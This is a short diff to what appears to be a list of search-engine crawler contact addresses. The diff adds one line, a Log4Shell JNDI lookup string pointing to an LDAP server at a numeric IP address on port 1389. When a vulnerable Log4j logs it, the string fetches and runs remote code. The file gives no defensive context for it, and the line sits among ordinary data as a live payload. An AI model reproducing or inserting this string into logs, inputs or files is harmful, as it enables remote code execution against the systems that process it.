@@ -1,3 +1,4 @@
+${jndi:ldap://185.8.172.132:1389/a}
 bingbot(at)microsoft.com
 googlebot(at)googlebot.com
 support@search.yandex.ru
